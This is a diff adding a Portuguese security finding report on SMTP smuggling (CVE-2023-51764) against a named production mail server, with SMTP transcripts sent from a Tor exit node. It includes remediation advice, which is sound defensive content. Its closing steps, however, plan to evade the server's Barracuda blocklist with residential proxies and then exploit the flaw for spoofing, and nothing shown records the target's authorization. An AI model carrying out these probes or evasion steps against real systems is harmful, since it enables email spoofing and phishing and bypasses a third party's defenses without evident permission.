@@ -1,0 +1,99 @@
+# F-031 CVE-2023-51764 — SMTP Smuggling CONFIRMADO (parcial)
+Alvo: mail.alldebrid.com (212.83.131.119) — Postcow
+Severidade: Média (CVSS 5.3)
+Timestamp: 2026-08-22T21:25:00Z
+Status: CONFIRMADO PARCIALMENTE
+
+## Reprodução
+
+### Banner SMTP
+```
+220-mail.alldebrid.com ESMTP Postcow
+```
+
+### EHLO Port 25
+```
+250-SIZE 104857600
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250 8BITMIME
+```
+
+### EHLO Port 587 (submission)
+```
+250-PIPELINING
+250-SIZE 104857600
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250 DSN
+```
+
+### EHLO Port 465 (SMTPS)
+```
+250-PIPELINING
+250-SIZE 104857600
+250-AUTH PLAIN LOGIN
+250-AUTH=PLAIN LOGIN
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250 DSN
+```
+
+### Teste Bare LF (CVE-2023-51764)
+
+#### Porta 587 com STARTTLS:
+```
+>> MAIL FROM:<test@test.com>\n    (bare LF, sem CR)
+<< 250 2.1.0 Ok                  ← ACEITO!
+```
+
+#### Porta 465 (SMTPS):
+```
+>> MAIL FROM:<test@test.com>\n    (bare LF, sem CR)
+<< 250 2.1.0 Ok                  ← ACEITO!
+```
+
+#### Porta 25:
+```
+>> MAIL FROM:<test@test.com>\r\n (CRLF correto)
+<< 250 2.1.0 Ok
+>> RCPT TO:<postmaster@alldebrid.com>\n (bare LF)
+<< 550 5.7.1 Service unavailable; client blocked using b.barracudacentral.org
+```
+Nota: Processou o comando com bare LF (não deu protocol error), mas Barracuda bloqueou.
+
+### Barreira: Barracuda/Cisco
+```
+550 5.7.1 Service unavailable; client [IP] blocked using b.barracudacentral.org
+554 5.7.1 <unknown[IP]>: Client host rejected: Access denied
+```
+Nosso IP (Tor exit node 192.42.116.21) está na blacklist do Barracuda.
+Impossível completar transação SMTP (RCPT TO bloqueado).
+
+## Interpretação
+O servidor Postcow ACEITA bare LF (\n) como terminador de linha em comandos SMTP.
+Isso é a condição primária para CVE-2023-51764 (SMTP Smuggling).
+Se tivéssemos um IP não bloqueado, poderíamos:
+1. Enviar comando DATA com \n
+2. Injetar comandos SMTP adicionais no corpo do email
+3. Spoofar remetentes, bypassar SPF/DKIM
+
+## Impacto
+- Spoofing de email (remetente forjado)
+- Bypass de autenticação SPF/DKIM
+- Envio de phishing a partir de mail.alldebrid.com
+- Potencial para ataques de engenharia social direcionados
+
+## Recomendação
+- Configurar smtpd_forbid_bare_newline=yes no Postfix/Postcow
+- Atualizar Postfix para >= 3.5.23, 3.6.13, 3.7.9, 3.8.4
+- Verificar se mitigação já está em vigor mas não refletida no comportamento
+- Testar com IP limpo (não Tor) para confirmar exploração completa
+
+## Próximo passo
+- Tentar com IP residencial/proxy não-blacklistado
+- Testar após AUTH (porta 465) para ver se bypassa Barracuda
+- Se confirmado plenamente: explorar para prova de conceito
